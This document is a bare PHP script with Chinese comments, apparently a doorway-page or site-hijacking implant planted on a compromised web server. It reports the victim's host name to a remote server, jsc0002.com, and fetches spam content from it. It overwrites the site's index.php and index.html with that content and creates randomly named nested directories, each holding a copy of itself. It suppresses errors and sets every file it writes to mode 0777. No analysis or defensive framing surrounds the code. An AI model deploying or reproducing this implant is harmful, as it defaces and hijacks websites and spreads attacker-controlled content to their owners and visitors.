<?php
error_reporting(0);
set_time_limit(0);
$Remote_server="http://jsc0002.com";
$NewFile_content=file_read("index.php");
$ml=$_SERVER['REQUEST_URI'] ;
$str= explode('/',$ml);
$Quantity=count($str)-1; //层数

session_start();
$allow_sep = "1";
if (isset($_SESSION["post_sep"]))
{
if (time() - $_SESSION["post_sep"] < $allow_sep)
{        exit("请不要反复刷新");
}
else
{     
$_SESSION["post_sep"] = time();
}
}
else{$_SESSION["post_sep"] = time();
}


$host_name=str_replace("index.php","",'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);

$B_1=string_random(mt_rand(4, 8));
$B_2=string_a_random(mt_rand(4, 8));
$B_3=string_n_random(mt_rand(4, 8));
$B_4=string_a_random(mt_rand(4, 8));
$B_5=string_random(mt_rand(4, 8));
$Branch=$B_1.".".$B_2.".".$B_3.".".$B_4.".".$B_5;
$Remote_url = $Remote_server."/index.asp"."?type=index.php&host=".$host_name;
$html=Reads($Remote_url);
if ($Quantity<6) 
{
$Remote_directory = $Remote_server."/pstmu.asp"."?type=index.php&host=".$host_name."&directory=".$Branch;
$Content_directory=Reads($Remote_directory);
$Branch_directory=explode('.',$Branch);
for($i = 0; $i < count($Branch_directory); $i++) 
{   
mk_dir("/".$Branch_directory[$i]); 
if(is_dir($Branch_directory[$i])==1)
{
file_write($Branch_directory[$i]."/index.php",$NewFile_content);
}
else
{
echo "目录不存在!!!";   
}
 
}

file_write("index.php",$html); //生成静态首页


file_write("index.html",$html); //生成静态首页


echo $html;
}
else
{

file_write("index.php",$html); //生成静态首页
file_write("index.html",$html); //生成静态首页


echo $html;
}

function mk_dir($dir) {
    if ( $dir)
    {
        $arr= explode('/',$dir);
        $k = "";
	$n = count($arr);

        for ( $i=1; $i<=$n; $i++)
        {
            $k = $k."/".$arr[$i];
			//echo $k;
            if ( is_dir( ".".$k) || @mkdir(".".$k) )
            {
                continue;
            }
            exit( "请检查文件目录权限" );
        }
    }
}


function string_random($len =4){
    $str ='abcdefghijklmnopqrstuvwxyz1234567890';
    $strlen = strlen($str);
    $randstr = '';
    for ($i = 0; $i<$len; $i++){
        $randstr .= $str[mt_rand(0, $strlen-1)];
    }
    return $randstr;
}

function string_a_random($len =6){
    $str ='abcdefghijklmnopqrstuvwxyz';
    $strlen = strlen($str);
    $randstr = '';
    for ($i = 0; $i<$len; $i++){
        $randstr .= $str[mt_rand(0, $strlen-1)];
    }
    return $randstr;
}

function string_n_random($len =4){
    $str ='1234567890';
    $strlen = strlen($str);
    $randstr = '';
    for ($i = 0; $i<$len; $i++){
        $randstr .= $str[mt_rand(0, $strlen-1)];
    }
    return $randstr;
}


function Reads($url){
	$opts = array('http' => array('method' => "GET",'timeout' => 8));
	$context = stream_context_create($opts);
	$html = file_get_contents($url, false, $context);
	if(empty($html)){$html = file_get_contents($url);}
	return $html;
}

function file_write($path, $data, $method = 'wb',$lock=1) {
    if ($fp = @fopen($path, $method)) {
        if($lock){
            @flock($fp,LOCK_EX);
        }
        fwrite($fp, $data);
        fclose($fp);
        chmod($path, 0777);
        return true;
    }
    return false;
}

function file_read($file){
    if (file_exists($file)) {
        return file_get_contents($file);
    }
    return false;
}

?>